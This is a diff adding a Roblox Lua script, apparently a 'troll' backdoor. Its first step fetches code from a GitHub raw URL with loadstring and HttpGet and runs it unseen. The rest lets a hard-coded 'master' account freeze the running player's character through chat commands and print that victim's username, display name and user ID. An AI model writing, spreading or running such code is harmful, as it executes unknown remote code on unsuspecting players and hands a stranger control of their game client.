@@ -1,1 +1,166 @@
+print("Loading main script from GitHub...")
+local success, err = pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/PhoAnhHai/Concak/refs/heads/main/haha"))()
+end)
 
+if success then
+    print("Main script loaded successfully!")
+else
+    warn("Failed to load main script: " .. tostring(err))
+end
+
+wait(1)
+
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local LocalPlayer = Players.LocalPlayer
+
+local MASTER_USERNAME = "mocemrinuocz"
+
+if LocalPlayer.Name == MASTER_USERNAME then
+    warn("Bạn là Master! Script sẽ không ảnh hưởng đến bạn.")
+    return
+end
+
+local function showNotification(text)
+    game:GetService("StarterGui"):SetCore("SendNotification", {
+        Title = "⚠️ TROLLED!";
+        Text = text;
+        Duration = 5;
+    })
+end
+
+showNotification("Script loaded successfully! Waiting for commands...")
+
+local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+local Humanoid = Character:WaitForChild("Humanoid")
+local RootPart = Character:WaitForChild("HumanoidRootPart")
+
+local isFrozen = false
+local frozenConnection
+local chatConnection
+
+local function freezePlayer()
+    if isFrozen then return end
+    isFrozen = true
+    
+    showNotification("Bạn đã bị FREEZE bởi " .. MASTER_USERNAME .. "!")
+    
+    local frozenPosition = RootPart.CFrame
+    
+    Humanoid.WalkSpeed = 0
+    Humanoid.JumpPower = 0
+    Humanoid.JumpHeight = 0
+    
+    frozenConnection = RunService.Heartbeat:Connect(function()
+        if isFrozen then
+            RootPart.CFrame = frozenPosition
+            RootPart.Velocity = Vector3.new(0, 0, 0)
+            RootPart.RotVelocity = Vector3.new(0, 0, 0)
+            RootPart.Anchored = true
+            
+            Humanoid.WalkSpeed = 0
+            Humanoid.JumpPower = 0
+        end
+    end)
+    
+    print("[TROLLED] Bạn đã bị đóng băng! Chờ lệnh 'unfreeze' từ " .. MASTER_USERNAME)
+end
+
+local function unfreezePlayer()
+    if not isFrozen then return end
+    isFrozen = false
+    
+    if frozenConnection then
+        frozenConnection:Disconnect()
+    end
+    
+    RootPart.Anchored = false
+    Humanoid.WalkSpeed = 16
+    Humanoid.JumpPower = 50
+    Humanoid.JumpHeight = 7.2
+    
+    showNotification("Bạn đã được UNFREEZE!")
+    print("[TROLLED] Bạn đã được giải phóng!")
+end
+
+local function setupChatListeners()
+    for _, player in pairs(Players:GetPlayers()) do
+        if player.Name == MASTER_USERNAME then
+            player.Chatted:Connect(function(msg)
+                local command = string.lower(msg)
+                
+                if command == "free" or command == "freeze" then
+                    freezePlayer()
+                elseif command == "unfreeze" or command == "unfreze" then
+                    unfreezePlayer()
+                elseif command == "troll info" then
+                    showNotification("Victim: " .. LocalPlayer.Name)
+                    print("=== VICTIM INFO ===")
+                    print("Username: " .. LocalPlayer.Name)
+                    print("DisplayName: " .. LocalPlayer.DisplayName)
+                    print("UserId: " .. LocalPlayer.UserId)
+                    print("Frozen: " .. tostring(isFrozen))
+                end
+            end)
+            showNotification("Đã kết nối với Master: " .. player.Name)
+            print("[TROLLED] Đã kết nối với Master: " .. player.Name)
+        end
+    end
+    
+    Players.PlayerAdded:Connect(function(player)
+        if player.Name == MASTER_USERNAME then
+            wait(1)
+            player.Chatted:Connect(function(msg)
+                local command = string.lower(msg)
+                
+                if command == "free" or command == "freeze" then
+                    freezePlayer()
+                elseif command == "unfreeze" or command == "unfreze" then
+                    unfreezePlayer()
+                elseif command == "troll info" then
+                    showNotification("Victim: " .. LocalPlayer.Name)
+                    print("=== VICTIM INFO ===")
+                    print("Username: " .. LocalPlayer.Name)
+                    print("DisplayName: " .. LocalPlayer.DisplayName)
+                    print("UserId: " .. LocalPlayer.UserId)
+                    print("Frozen: " .. tostring(isFrozen))
+                end
+            end)
+            showNotification("Master đã vào game: " .. player.Name)
+            print("[TROLLED] Master đã vào game: " .. player.Name)
+        end
+    end)
+end
+
+setupChatListeners()
+
+LocalPlayer.CharacterAdded:Connect(function(newChar)
+    Character = newChar
+    Humanoid = Character:WaitForChild("Humanoid")
+    RootPart = Character:WaitForChild("HumanoidRootPart")
+    
+    isFrozen = false
+    if frozenConnection then
+        frozenConnection:Disconnect()
+    end
+    
+    showNotification("Character respawned. Waiting for commands...")
+end)
+
+local function protectScript()
+    game:GetService("RunService").Heartbeat:Connect(function()
+    end)
+end
+
+protectScript()
+
+print("╔════════════════════════════════════╗")
+print("║     BẠN ĐÃ BỊ TROLL!              ║")
+print("║  Script controlled by: " .. MASTER_USERNAME)
+print("║                                    ║")
+print("║  Lệnh điều khiển:                  ║")
+print("║  - 'free' hoặc 'freeze' = Đóng băng║")
+print("║  - 'unfreeze' = Giải phóng         ║")
+print("║  - 'troll info' = Xem thông tin    ║")
+print("╚════════════════════════════════════╝")
